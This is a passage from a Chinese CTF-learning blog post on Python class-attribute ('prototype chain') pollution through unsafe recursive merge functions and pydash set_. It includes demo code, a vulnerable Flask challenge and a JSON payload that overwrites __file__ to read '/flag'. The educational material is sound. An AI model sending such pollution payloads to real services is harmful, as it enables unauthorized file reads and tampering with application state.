



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta name="referrer" content="no-referrer"/>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="Web" />


<link rel="canonical" href="http://blog.g01den.top/posts/ff5b88d5.html">



  <title>
python原型链污染 - Web狗的自我安慰 |
golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
<meta name="generator" content="Hexo 7.2.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">python原型链污染
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2024-07-21 04:48:16">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2024-07-21T04:48:16+08:00">2024-07-21</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
          <img src="https://gitee.com/gou-dengyue/images/raw/master/picture308.jpg">
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Web/" itemprop="item" rel="index" title="分类于 Web狗的自我安慰"><span itemprop="name">Web狗的自我安慰</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/ff5b88d5.html">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="g01den">
    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="golden的部落阁">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="python原型链污染"><a class="markdownIt-Anchor" href="#python原型链污染">#</a> python 原型链污染</h1>
<p>​		后面会有跟着 Article_kelp 慢慢操作的，前面先面向题目学习。</p>
<h2 id="背景"><a class="markdownIt-Anchor" href="#背景">#</a> 背景：</h2>
<p>​		国赛遇到了这个考点，然后之后的 DASCTF 夏季挑战赛也碰到了，抓紧粗略学一手，学了 JavaScript 之后再深究原型链污染。</p>
<h2 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介：</h2>
<p>​		python 中的原型链污染是指通过修改对象原型链中的属性，对程序的行为产生以外影响或利用漏洞进行攻击的一种技术。</p>
<p>​		在 Python 中，对象的属性和方法可以通过原型链继承来获取。每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等</p>
<p>​		这个知识点应用的范围比较小，仅当题目中出现 <code>utils</code>  的 <code>merge</code>  或 <code>Pydash(5.1.2)</code>  模块中的 <code>set</code>  和 <code>set_with</code>  函数才会用上。</p>
<h2 id="merge没遇到过具体题型先简单说下"><a class="markdownIt-Anchor" href="#merge没遇到过具体题型先简单说下">#</a> merge（没遇到过具体题型，先简单说下）：</h2>
<p>​		首先是下面这个程序，可以再 merge 打个断点，debug 试试看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#world</span></span><br><span class="line"><span class="built_in">print</span>(father.secret)</span><br><span class="line"><span class="comment">#world</span></span><br></pre></td></tr></table></figure>
<p>​		这就是一个简单的污染 father 类的 secret 属性的一个程序，可以看到的是，最后 father.secret 确实是被污染了。</p>
<p>​		当然，内置属性例如 __str__，</p>
<p>​	<strong>特别注意：</strong></p>
<p>​		并不是所有的类的属性都可以被污染，如 <code>Object</code>  的属性就无法被污染，所以需要目标类能够被切入点类或对象可以通过属性值查找获取到</p>
<blockquote>
<p><strong>大佬是这么说的</strong></p>
<p>通过断点调试可以看出这个 merge 函数在走到 hasattr 处，由于我们的 payload 是一层字典套一层字典，就会递归调用 merge，并且由于 getattr (dst,k)，dst 就在一直按着 payload 的键发生变化，从到类，再到父类，最后把父类的 secret 赋值为 polluted，成功实现了原型链污染。</p>
<p>payload 也很好理解，其实就是利用了 python 的链式继承关系，最后找到这个类即可，和 SSTI 通过链式继承关系找 os 模块很像。</p>
<p>类的内置属性，如 <code>__str__</code> 也可以被污染，但是需要注意，并不是所有类的属性都可以被污染，比如 <code>Object</code>  就无法被污染。</p>
</blockquote>
<h2 id="pydash512"><a class="markdownIt-Anchor" href="#pydash512">#</a> pydash(5.1.2)：</h2>
<p>​		由于暂时不会 Sanic 框架的编写，所以先暂时用下 flask 框架， 差距应该不大。</p>
<p>​		先看看下面这个代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span>:</span><br><span class="line">    secret_value = <span class="string">&quot;safe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">pollutant = Pollution()</span><br><span class="line">father = Father()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;key&quot;</span> : <span class="string">&quot;__class__.__init__.__globals__.father.secret_value&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span> : <span class="string">&quot;polluted&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = payload[<span class="string">&quot;key&quot;</span>]</span><br><span class="line">value = payload[<span class="string">&quot;value&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(father.secret_value)</span><br><span class="line"><span class="comment">#safe</span></span><br><span class="line">set_(pollutant,key, value)</span><br><span class="line"><span class="built_in">print</span>(father.secret_value)</span><br><span class="line"><span class="comment">#polluted</span></span><br></pre></td></tr></table></figure>
<p>​		如上，我们最后成功污染了 Father 类的 secret_value 属性，大概思路就是通过 key 里的这个链子去找到 father.secret_value 这个属性，然后进行污染，污染为 value 的值。</p>
<p>​		也正因为如此，所以写一个 Web 服务来试试看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> pydash <span class="keyword">import</span> set_</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pollute&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollution</span>():</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">r&quot;key&quot;</span>: <span class="string">r&quot;__init__.__globals__.__file__&quot;</span>,</span><br><span class="line">        <span class="string">r&quot;value&quot;</span>: <span class="string">r&quot;D:\html study\PyCharm Project\flask_pydash1\flag&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    key = payload[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = payload[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    pollute = Pollute()</span><br><span class="line">    set_(pollute,key,value)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Finished pollute &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>​		不知为何，这里写的 Web 服务中，Pollution () 这里传入 reqeust 参数总是会出错，所以这里就用这种方式直接规定了 key 和 value 的值，作为一种输入方式。</p>
<p>​		首先第一次访问根路由，得到的页面如下：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/188c10d495a342d4927f7d8a8b841d58.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		之后，尝试访问下 /pollute 路由，返回了一个 Finished pollute ，随后再去访问下根路由，得到的如下：</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/e35d4eadef714422b7670dcc405fc905.png#pic_center" alt="在这里插入图片描述"></p>
<p>​		成功读取到了我提前准备的 flag。</p>
<p>​		原因就是因为在__globals__里找到了__file__属性，然后才能进行污染。</p>
<h2 id="dasctf-2023-0x401七月暑期挑战赛ezflask"><a class="markdownIt-Anchor" href="#dasctf-2023-0x401七月暑期挑战赛ezflask">#</a> [DASCTF 2023 &amp; 0X401 七月暑期挑战赛] EzFlask：</h2>
<p>​		（小声嘀咕）：前面才刚说了没遇到 merge 的题，这就遇到了。</p>
<p>​		首先，打开就是源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		审计一下，发现了几个点，首先是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>
<p>​		就像最开始说的那样，存在 merge 函数，然后下一个有用的信息是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<p>​		读取了内置属性 __file__ 的值，最后一个重要的信息是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br></pre></td></tr></table></figure>
<p>​		这里发现，在该函数中调用了 merge () 函数，并且，data 可控，那么，payload 应该就显而易见了：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span>#当flag在根目录下以及flag文件名知道的情况下</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
